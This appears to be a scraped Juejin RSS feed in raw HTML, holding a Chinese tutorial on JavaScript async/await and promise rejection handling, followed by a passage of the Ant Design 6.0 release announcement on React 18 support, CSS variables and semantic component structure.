pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">async 函数永远会返回一个promise,即使你在函数中没有返回任何值。</h4>
<p>async 函数永远会返回一个promise,即使你在函数中没有返回任何值。<br/>
因为：返回没有返回值时函数默认返回的是 undefined.<br/>
所以：会返回一个 promise，这个 promise 的 值为 undefined。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'doThingFn'</span>)
}

<span class="hljs-comment">// async 函数永远会返回一个promise,即使你在函数中没有返回任何值。</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>, <span class="hljs-title function_">doThingFn</span>())

<span class="hljs-comment">// 输出的值是 undefined</span>
<span class="hljs-comment">// 因为async 函数会返回一个promise, 所以我们是可以写then的。</span>
<span class="hljs-title function_">doThingFn</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span>=&gt;</span>{
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'输出的值是'</span>,res)
})
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bceed9a3fe444f3899a47aceda0c4a81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR55qEZGl25Lii5LqG6IK_5LmI5Yqe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561602&amp;x-signature=wMre96k%2FQuFIeVuMKlPeYCZ6b0s%3D" alt="image" loading="lazy"/></p>
<h4 data-id="heading-1">async 函数的返回是Promise.resolve</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'doThingFn'</span>)
}
</code></pre>
<p>等于与下面的</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-comment">// 返回没有返回值时函数默认返回的是 undefined.</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">undefined</span>)
}
</code></pre>
<h4 data-id="heading-2">当 await 遇到一个被拒绝的 Promise 时，它会抛出异常。因此需要被捕获</h4>
<p>下面依次输出的结果是：A</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'D'</span> )
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>为啥只会输出:A ？<br/>
因为当 await 遇到一个被拒绝的 Promise 时，它会抛出异常。我们没有捕获，直接就会报错的。<br/>
因此下面的 C 不会输出。</p>
<h4 data-id="heading-3">为啥不会输出 C</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">try</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
    <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  }<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
  }
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>分析：当 await 遇到被拒绝的 Promise 时(就是说：Promise.reject)：<br/>
立即抛出异常，中断当前代码块的执行。<br/>
（如果有catch）, 直接跳转到最近的 catch 块<br/>
await 之后的代码不会执行,因此不会输出 C。</p>
<h4 data-id="heading-4">如何让他输出C</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">try</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
    <span class="hljs-comment">// 我们在这里将它捕获掉。这样就可以输出C</span>
    <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span>=&gt;</span>{
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
    })
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  }<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
  }
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<h4 data-id="heading-5">如何正确获取到B的值</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">timeOutFn</span>(<span class="hljs-params"/>){
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'B'</span>)
  },<span class="hljs-number">5000</span>)
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-comment">// 如何让这里正确获取到B的值</span>
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">timeOutFn</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2)
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>这样就可以获取到值啦~~~</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">timeOutFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>{
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'B'</span>)
    },<span class="hljs-number">5000</span>)
  })
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-comment">// return new Promise(...) 是 timeOutFn 函数的返回值</span>
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">timeOutFn</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2)
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>有的小伙伴会问：  resolve('B') 为啥不需要return<br/>
因为： resolve 是一个回调函数，它用来改变 Promise 的状态从 "pending" 到 "fulfilled"<br/>
调用 resolve('B') 只是通知 Promise 完成，并传递值 'B' 给后续的 .then() 或 await<br/>
return new Promise(...) 是 timeOutFn 函数的返回值<br/>
resolve('B') 是设置 Promise 的解析值，不是函数的返回值</p>
<h3 data-id="heading-6">await 不能单独使用，需要配合async一起使用。</h3>
<h4 data-id="heading-7">不要乱用await，因为 await 是基于 Promise 一起使用的(后面跟的是一个 Promise 对象)</h4>
<h4 data-id="heading-8">async 和 await 的语法规则</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-number">1</span>, <span class="hljs-keyword">async</span> 是 <span class="hljs-keyword">function</span> 的一个前缀，只有 <span class="hljs-keyword">async</span> 函数中才能使用 <span class="hljs-keyword">await</span> 语法  
<span class="hljs-number">2</span>, <span class="hljs-keyword">async</span> 函数永远会返回一个promise,即使你在函数中没有返回任何值。  
<span class="hljs-number">3</span>, <span class="hljs-keyword">await</span> 后面跟的是一个 <span class="hljs-title class_">Promise</span> 对象，如果不是，则会包裹一层 <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()  
</code></pre>
<h4 data-id="heading-9">await和async的主要作用</h4>
<p>await和async 主要是用来优化处理回调地狱的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🎉 Ant Design 6.0 来了！ 🎉]]></title>    <link>https://juejin.cn/post/7575751471842230308</link>    <guid>https://juejin.cn/post/7575751471842230308</guid>    <pubDate>2025-11-24T03:37:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842230308" data-draft-id="7575937594350551083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🎉 Ant Design 6.0 来了！ 🎉"/> <meta itemprop="keywords" content="React.js,Ant Design"/> <meta itemprop="datePublished" content="2025-11-24T03:37:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="zombieJ"/> <meta itemprop="url" content="https://juejin.cn/user/4406498335924669"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🎉 Ant Design 6.0 来了！ 🎉
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4406498335924669/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    zombieJ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:37:11.000Z" title="Mon Nov 24 2025 03:37:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>自开源以来，Ant Design 已收获 <strong>96.6K Star</strong>、累计 <strong>31.9K issue</strong>、<strong>20.7K PR</strong>、发布了 <strong>904 个 npm 版本</strong>，并有 <strong>2314 位贡献者</strong> 共同参与其中。这些数字不仅代表着社区的活跃度与支持，也见证了项目的不断进化与成熟。</p>
<p>正因为你们，Ant Design 才能不断成长，向下一站前行：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fant-design%2Fdiscussions%2F51919" target="_blank" title="https://github.com/ant-design/ant-design/discussions/51919" ref="nofollow noopener noreferrer">《Plan about Ant Design 6.0》</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d501f3ac2039489787fa9175f8ce94a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=gfXyCzjp1%2BXDPgJqPtSN0EKoF0k%3D" alt="Ant Design 6.0" loading="lazy"/></p>
<p>经过大量 RFC 讨论以及多个 Alpha 版本的迭代，v6 已进入稳定阶段。今天，我们宣布 Ant Design v6 正式发布！</p>
<p>本次升级以 <strong>技术侧深度优化</strong> 为重点，旨在为 React 19 以及未来版本提供更好的兼容与性能（版本兼容提升至 React 18），并进一步完善组件的语义化结构和 CSS 变量支持。</p>
<p>与 v5 不同，这次升级是 <strong>平滑版本迁移</strong>：</p>
<ul>
<li>如果你的项目已经运行在 v5，无需使用兼容包或 codemod 工具，即可直接升级到 v6。</li>
<li>v5 主分支将切换至 <code>v5.x-stable</code> 进入 <strong>1 年维护周期</strong>。
<ul>
<li>除非出现特别严重的 Bug，我们不会再对 v5 进行功能性更新。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-1">技术升级与核心变化</h2>
<h3 data-id="heading-2">⚛ React 最低版本要求提升至 18</h3>
<p>v6 支持版本从 React 18 起，移除了此版本之前的 React 兼容逻辑，避免了不同版本间的 API 行为差异。<br/>
我们仍然建议使用最新的 React 19 版本以获得最佳体验。</p>
<p>对于静态方法比如 <code>Modal.confirm</code>，你已经不需要额外的兼容代码或依赖，可直接移除相关兼容代码：</p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-- import '@ant-design/v5-patch-for-react-19';</span>
</code></pre>
<h4 data-id="heading-3">📦 dist 开启 React Compiler</h4>
<p>在打包产物 <code>antd.js</code> 以及 <code>antd.min.js</code> 中启用了 <code>React Compiler</code> 以优化性能，对使用 CJS/ESM 场景的用户可自行选择开启，参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzh-hans.react.dev%2Flearn%2Freact-compiler" target="_blank" title="https://zh-hans.react.dev/learn/react-compiler" ref="nofollow noopener noreferrer">React 官方文档</a>。</p>
<h3 data-id="heading-4">🌈 纯 CSS Variables 样式架构</h3>
<p>随着 IE 支持的彻底移除，v6 中的 <code>@ant-design/cssinjs</code> 默认采用 <strong>纯 CSS Variables 模式</strong>：</p>
<ul>
<li>样式切换更轻量，支持实时主题变化。</li>
<li>多主题复用降低打包体积。</li>
<li>支持零运行时样式生成，可搭配 <code>@ant-design/static-style-extract</code>：</li>
</ul>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">ConfigProvider</span> theme={{ <span class="hljs-attr">zeroRuntime</span>: <span class="hljs-literal">true</span> }}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>
&lt;/<span class="hljs-title class_">ConfigProvider</span>&gt;
</code></pre>
<p>性能对比如下，zeroRuntime 模式表现最佳（水平轴为主题数量）：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4de97f05147748d0af7780584115173a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Rkh%2FsPRekDaDSAX1Y186myrzzHQ%3D" alt="Size" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73e8d833c4b349359a4a0776707c6007~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=e7QbHETV9sqsRUnOm4irJm7psec%3D" alt="Speed" loading="lazy"/></p>
<p>你可以通过 <code>useToken</code> 获取完整变量名：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> {
    <span class="hljs-attr">cssVar</span>: { colorBgElevated },
  } = theme.<span class="hljs-title function_">useToken</span>();
};
</code></pre>
<h4 data-id="heading-5">🚫 不再支持 IE</h4>
<p>CSS Variables 模式彻底移除 IE 兼容的 StyleProvider。</p>
<h3 data-id="heading-6">🧩 全量组件语义化结构</h3>
<p>v6 完成了 <strong>所有组件</strong> 的 DOM 语义化改造：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a54f3d23bd74f3f8b269c116aa89d9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Ojzu3Xb78GSlzNTFgKuB41GwBOE%3D" alt="Semantic Structure" loading="lazy"/></p>
<ul>
<li>#52115</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ac32b5e154a4e63afde02aad6c50f68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Mjc0ByWR9ZeMrih4EBOI8VIRpVE%3D" alt="Semantic Render Props" loading="lazy"/></p>
<ul>
<li>#54995</li>
</ul>

<ul>
<li>API 使用逻辑位置描述（如 <code>start</code> / <code>end</code>），支持 RTL。</li>
<li>内部结构可用 ConfigProvider 的 <code>classNames</code> 和 <code>styles</code> 统一配置。
<ul>
<li>支持函数式动态生成语义结构：</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-attr">btnClassNames</span>: <span class="hljs-title class_">ButtonProps</span>[<span class="hljs-string">'classNames'</span>] = <span class="hljs-function">(<span class="hljs-params">{ props }</span>) =&gt;</span> {
  <span class="hljs-keyword">switch</span> (props.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'primary'</span>:
      <span class="hljs-keyword">return</span> { ... };
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> { ... };
  }
};

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ConfigProvider</span> <span class="hljs-attr">button</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">classNames:</span> <span class="hljs-attr">btnClassNames</span> }}&gt;</span>
